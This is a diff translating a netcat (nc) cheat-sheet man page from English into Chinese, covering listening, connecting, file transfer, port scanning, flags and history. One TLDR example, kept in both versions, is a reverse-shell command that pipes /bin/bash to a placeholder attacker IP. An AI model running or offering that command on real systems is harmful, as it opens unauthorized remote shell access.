@@ -1,42 +1,42 @@
 # TAGLINE
 
-Read and write arbitrary data across TCP and UDP connections — the network Swiss-army knife
+通过 TCP 和 UDP 连接读写任意数据——网络界的瑞士军刀
 
 # TLDR
 
-**Listen** on a TCP port and print whatever is sent
+在 TCP 端口上**监听**并打印收到的内容
 
 ```nc -l [8080]```
 
-**Connect** to a host on a port
+**连接**到主机的某个端口
 
 ```nc [host] [port]```
 
-**Send a file** over a connection (sender side)
+通过连接**发送文件**（发送方）
 
 ```nc [host] [port] < [file.txt]```
 
-**Receive a file** over a connection (listener side)
+通过连接**接收文件**（监听方）
 
 ```nc -l [port] > [file.txt]```
 
-**Scan a port range** without sending data
+**扫描端口范围**且不发送数据
 
 ```nc -zv [host] [20-30]```
 
-**Use UDP** instead of TCP
+用 **UDP** 代替 TCP
 
 ```nc -u [host] [port]```
 
-**Set an idle and connect timeout** of 5 seconds
+设置 **5 秒的空闲与连接超时**
 
 ```nc -w [5] [host] [port]```
 
-**Open a simple chat / serial bridge** on stdin/stdout
+在 stdin/stdout 上打开简单的聊天/串口桥
 
 ```nc -l [1234]```
 
-**Make a quick reverse shell** (use only when authorized)
+快速创建反向 shell（仅在获得授权时使用）
 
 ```nc -e [/bin/bash] [attacker_ip] [4444]```
 
@@ -49,71 +49,71 @@ Read and write arbitrary data across TCP and UDP connections — the network Swi
 # PARAMETERS
 
 **-l**
-> Listen for an incoming connection rather than initiating one.
+> 监听传入连接，而不是主动发起连接。
 
 **-k**
-> (OpenBSD/Ncat) Keep listening after a client disconnects; accept multiple connections.
+> （OpenBSD/Ncat）客户端断开后继续监听；接受多个连接。
 
 **-u**
-> Use UDP instead of the default TCP.
+> 使用 UDP 而不是默认的 TCP。
 
 **-z**
-> Zero-I/O mode — open the connection only to test if the port is open. Combine with **-v** for scanning.
+> 零 I/O 模式——仅打开连接以测试端口是否开放。配合 **-v** 用于扫描。
 
 **-v** / **-vv**
-> Verbose; print connection and protocol diagnostics. Repeat for more detail.
+> 详细输出；打印连接和协议诊断信息。重复使用可获得更多细节。
 
 **-n**
-> Do not perform any DNS or service-name lookups.
+> 不执行任何 DNS 或服务名查询。
 
 **-w** _SECONDS_
-> Connect/idle timeout. The connection is closed after _seconds_ with no data.
+> 连接/空闲超时。连接在 _seconds_ 秒内无数据后关闭。
 
 **-q** _SECONDS_
-> After EOF on stdin, wait _seconds_ before closing the network socket (use -1 to wait forever).
+> stdin 上遇到 EOF 后，等待 _seconds_ 秒再关闭网络套接字（用 -1 表示无限等待）。
 
 **-p** _PORT_
-> Bind the local end of the connection to _port_ (source port).
+> 将连接的本地端绑定到 _port_（源端口）。
 
 **-s** _ADDR_
-> Bind the local end of the connection to _addr_ (source address).
+> 将连接的本地端绑定到 _addr_（源地址）。
 
 **-e** _COMMAND_
-> (traditional/ncat with --allow-exec) Execute _command_ after the connection is made, redirecting its I/O to the socket. Disabled in many distributions for security.
+> （传统版本/带 --allow-exec 的 ncat）建立连接后执行 _command_，并将其 I/O 重定向到套接字。出于安全考虑，许多发行版已禁用此功能。
 
 **-4** / **-6**
-> Force IPv4 or IPv6.
+> 强制使用 IPv4 或 IPv6。
 
 **-U**
-> Use Unix-domain sockets instead of TCP/UDP. The "port" argument is then a socket path.
+> 使用 Unix 域套接字代替 TCP/UDP。此时"port"参数为套接字路径。
 
 **-X** _PROTOCOL_
-> Connect through a proxy using PROTOCOL: 4 (SOCKS4), 5 (SOCKS5), or connect (HTTP CONNECT).
+> 通过代理连接，PROTOCOL 可取：4（SOCKS4）、5（SOCKS5）或 connect（HTTP CONNECT）。
 
 **-x** _ADDR_[_:port_]
-> Address (and optional port) of the proxy server used with **-X**.
+> 与 **-X** 配合使用的代理服务器地址（及可选端口）。
 
 # DESCRIPTION
 
-**nc** (netcat) reads and writes data across network connections using TCP or UDP. It is intended both as a reliable back-end tool that can be driven by other programs and scripts, and as a feature-rich network debugging and exploration tool.
+**nc**（netcat）使用 TCP 或 UDP 在网络连接上读取和写入数据。它既可以作为可被其他程序和脚本驱动的可靠后端工具，也可以作为功能丰富的网络调试和探测工具。
 
-Common uses include opening ad-hoc client/server sockets, transferring files, banner grabbing, port scanning (**-z**), proxying, listening on Unix-domain sockets (**-U**), and tunnelling through SOCKS or HTTP CONNECT proxies (**-X**, **-x**).
+常见用途包括：临时开启客户端/服务器套接字、传输文件、抓取横幅信息、端口扫描（**-z**）、代理转发、在 Unix 域套接字上监听（**-U**），以及经由 SOCKS 或 HTTP CONNECT 代理建隧道（**-X**、**-x**）。
 
-Several incompatible implementations are commonly installed under the name **nc**:
+有几个互不兼容的实现通常都以 **nc** 这个名称安装：
 
-- **OpenBSD netcat** — the default on most Linux and macOS systems; widely scriptable, no `-e`.
-- **GNU netcat** — older, simpler, supports `-e`.
-- **Ncat** (Nmap project) — scriptable replacement with TLS, IPv6, proxies, and brokered relays.
+- **OpenBSD netcat**——大多数 Linux 和 macOS 系统上的默认版本；易于脚本化，没有 `-e`。
+- **GNU netcat**——较旧、较简单，支持 `-e`。
+- **Ncat**（Nmap 项目）——可脚本化的替代品，支持 TLS、IPv6、代理和中继。
 
-Behaviour and supported flags vary between them; check `nc -h` to see which version is installed.
+各实现的行为和支持的选项有所不同；用 `nc -h` 查看已安装的是哪个版本。
 
 # CAVEATS
 
-Flag set differs across implementations — scripts portable to one **nc** may break on another. The **-e** option (execute a program after connect) is disabled in OpenBSD netcat for security; many hardened distributions ship without it. Listening with **nc** offers no authentication or encryption — never expose a raw nc listener on an untrusted network.
+不同实现的选项集不同——针对某一个 **nc** 编写的可移植脚本在另一个实现上可能失效。**-e** 选项（连接后执行程序）出于安全考虑在 OpenBSD netcat 中已被禁用；许多加固过的发行版不带该功能。用 **nc** 监听不提供任何身份验证或加密——绝不要在不受信任的网络上暴露裸 nc 监听器。
 
 # HISTORY
 
-Original netcat was written by **"Hobbit"** and posted to `alt.security` in **1995–1996**. The OpenBSD project later rewrote it from scratch and that variant became the de-facto standard on BSD, macOS and most modern Linux distributions. **Ncat** was developed as part of the **Nmap** project to add modern features (TLS, IPv6, proxying, brokered relays).
+最初的 netcat 由 **"Hobbit"** 编写，于 **1995–1996 年**发布到 `alt.security`。OpenBSD 项目后来从零重写了它，该版本成为 BSD、macOS 和大多数现代 Linux 发行版的事实标准。**Ncat** 作为 **Nmap** 项目的一部分开发，增加了现代特性（TLS、IPv6、代理、中继）。
 
 # INSTALL
 
@@ -128,4 +128,3 @@ Original netcat was written by **"Hobbit"** and posted to `alt.security` in **19
 # SEE ALSO
 
 [ncat](/man/ncat)(1), [socat](/man/socat)(1), [telnet](/man/telnet)(1), [curl](/man/curl)(1), [ssh](/man/ssh)(1)
-
